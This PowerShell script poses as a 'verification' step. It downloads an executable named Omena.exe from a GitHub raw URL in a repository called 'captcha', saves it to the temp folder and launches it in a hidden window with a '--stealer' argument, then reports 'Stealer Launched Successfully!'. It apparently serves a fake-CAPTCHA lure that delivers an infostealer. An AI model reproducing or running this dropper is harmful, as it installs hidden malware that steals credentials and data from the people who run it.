# DEBUG VERSION - DO NOT REMOVE Read-Host
Write-Host "=== VERIFICATION STARTED ===" -ForegroundColor Cyan

$exe = "$env:TEMP\Omena.exe"
$url = "https://raw.githubusercontent.com/urho122-cpu/captcha/refs/heads/main/Omena.exe"

Write-Host "Attempting to download..." -ForegroundColor Yellow

try {
    (New-Object Net.WebClient).DownloadFile($url, $exe)
    Write-Host "Download Successful!" -ForegroundColor Green
    Start-Process $exe -ArgumentList '--stealer' -WindowStyle Hidden
    Write-Host "Stealer Launched Successfully!" -ForegroundColor Green
} catch {
    Write-Host "ERROR OCCURRED: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Full Error: $($_.Exception)" -ForegroundColor Red
}

Write-Host "=== END OF SCRIPT ===" -ForegroundColor Cyan
Read-Host "Press ENTER to close this window..."
